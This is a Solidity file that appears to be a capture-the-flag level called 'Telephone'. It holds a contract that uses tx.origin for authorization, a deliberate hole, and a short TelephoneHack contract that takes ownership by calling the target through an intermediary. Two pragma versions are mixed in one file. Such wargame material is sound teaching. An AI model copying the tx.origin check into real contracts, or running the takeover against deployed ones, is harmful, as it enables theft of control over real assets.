// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/*
Claim ownership of the contract below to complete this level.

Things that might help:
- See the Help page above, section "Beyond the console"
*/

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

pragma solidity ^0.8.0;

contract TelephoneHack {
    Telephone public telephone = Telephone(0x7BB551e6285EB6bc8FA3B00a3B1c30F7144A599F);
    constructor() {
        telephone.changeOwner(msg.sender);
    }
}